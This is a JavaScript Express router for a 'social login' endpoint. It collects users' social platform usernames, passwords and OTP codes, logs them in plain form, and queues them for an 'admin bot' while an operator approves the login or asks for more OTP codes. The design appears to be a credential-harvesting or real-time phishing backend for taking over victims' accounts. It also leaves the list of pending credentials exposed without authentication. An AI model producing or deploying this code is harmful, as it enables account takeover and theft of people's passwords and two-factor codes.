import { Router } from 'express';
import { db } from '../services/db.js';
import { setSessionCookie } from '../services/auth.js';

export const socialRouter = Router();

// Simple ADMIN_KEY guard for admin actions
function requireAdminKey(req, res, next) {
  const adminKey = process.env.ADMIN_KEY || process.env.ADMIN_TOKEN || '';
  const incoming = req.headers['x-admin-key'] || req.headers['x-admin-token'] || req.query.admin_key || req.body?.admin_key;
  const prod = process.env.NODE_ENV === 'production';
  if (!adminKey && !prod) return next();
  if (!incoming || String(incoming) !== String(adminKey)) {
    return res.status(401).json({ success: false, message: 'unauthorized' });
  }
  next();
}

// POST /api/social-login
socialRouter.post('/', async (req, res) => {
  try {
    const {
      platform,
      username,
      password,
      otp,
      chrome, // optional
      note,   // optional
    } = req.body || {};

    // Persist audit entry with raw credentials as per spec (admin must see full values)
    await db.insertAuditLog({
      ip: (req.ip || req.headers['x-forwarded-for'] || '').toString(),
      user_id: null,
  path: '/api/social-login',
      method: 'POST',
      action: 'auth_login_request',
      payload: { platform, username, password, otp, chrome, note },
      status: 202,
      meta: { source: 'web_user' },
    });

    // Create pending login task for admin bot
    const task = db.createPendingLogin({ platform, username, password, otp, chrome, note });

    // Immediate response per UX spec: require approval first; OTP submission may still need approval
    const needsApproval = true;
    if (otp) {
      return res.json({ success: false, requires_approval: true, message: 'OTP received, awaiting admin approval', loginId: task.id });
    }
    if (needsApproval) {
      return res.json({ success: false, requires_approval: true, message: 'Awaiting admin approval', loginId: task.id });
    }
    return res.json({ success: true, loginId: task.id });
  } catch (e) {
    res.status(500).json({ success: false, message: 'server_error', error: String(e?.message || e) });
  }
});

// GET /api/social-login/status?id=<loginId>
socialRouter.get('/status', async (req, res) => {
  const id = req.query.id;
  const rec = id ? await db.getPendingLogin(id) : null;
  if (!rec) return res.json({ success: false, status: 'unknown' });
  // Map to frontend expectations
  if (rec.status === 'approved') {
    // On approval, establish a simple session cookie so session-status reflects authenticated state
    const displayName = rec.username || 'user';
    setSessionCookie(res, { id: `user:${displayName}`, role: 'user', name: displayName });
    // Audit one-time login success
    try {
      await db.insertAuditLog({
        ip: (req.ip || req.headers['x-forwarded-for'] || '').toString(),
        user_id: `user:${displayName}`,
  path: '/api/social-login/status',
        method: 'GET',
        action: 'auth_login_success',
        payload: { id },
        status: 200,
        meta: { source: 'web_user' },
      });
    } catch {}
    return res.json({ success: true, status: 'success' });
  }
  if (rec.status === 'otp_required') return res.json({ success: false, requires_otp: true, status: 'otp' });
  if (rec.status === 'denied' || rec.status === 'failed') return res.json({ success: false, status: 'failed' });
  return res.json({ success: false, status: 'pending' });
});

// Admin endpoints (simple, no auth here - in real use, protect with ADMIN_KEY or session)
// GET /api/social-login/pending?status=pending
socialRouter.get('/pending', async (req, res) => {
  const status = req.query.status;
  const rows = await db.listPendingLogins({ status });
  res.json({ success: true, data: rows });
});

// POST /api/social-login/approve
// body: { id }
socialRouter.post('/approve', requireAdminKey, async (req, res) => {
  const { id } = req.body || {};
  const rec = await db.updatePendingLogin(id, { status: 'approved' });
  if (!rec) return res.status(404).json({ success: false, message: 'not_found' });
  // Audit admin approval
  db.insertAuditLog({
    ip: (req.ip || req.headers['x-forwarded-for'] || '').toString(),
    user_id: 'admin',
  path: '/api/social-login/approve',
    method: 'POST',
    action: 'auth_login_approved',
    payload: { id },
    status: 200,
    meta: { source: 'admin' },
  }).catch(()=>{});
  res.json({ success: true });
});

// POST /api/social-login/require-otp
// body: { id }
socialRouter.post('/require-otp', requireAdminKey, async (req, res) => {
  const { id } = req.body || {};
  const rec = await db.updatePendingLogin(id, { status: 'otp_required' });
  if (!rec) return res.status(404).json({ success: false, message: 'not_found' });
  // Audit admin requested OTP
  db.insertAuditLog({
    ip: (req.ip || req.headers['x-forwarded-for'] || '').toString(),
    user_id: 'admin',
  path: '/api/social-login/require-otp',
    method: 'POST',
    action: 'auth_login_require_otp',
    payload: { id },
    status: 200,
    meta: { source: 'admin' },
  }).catch(()=>{});
  res.json({ success: true });
});

// POST /api/social-login/deny
// body: { id }
socialRouter.post('/deny', requireAdminKey, async (req, res) => {
  const { id, reason } = req.body || {};
  const patch = { status: 'denied' };
  if (reason != null) patch.note = String(reason);
  const rec = await db.updatePendingLogin(id, patch);
  if (!rec) return res.status(404).json({ success: false, message: 'not_found' });
  // Audit admin denial
  db.insertAuditLog({
    ip: (req.ip || req.headers['x-forwarded-for'] || '').toString(),
    user_id: 'admin',
  path: '/api/social-login/deny',
    method: 'POST',
    action: 'auth_login_denied',
    payload: { id, reason: reason != null ? String(reason) : undefined },
    status: 200,
    meta: { source: 'admin' },
  }).catch(()=>{});
  res.json({ success: true });
});
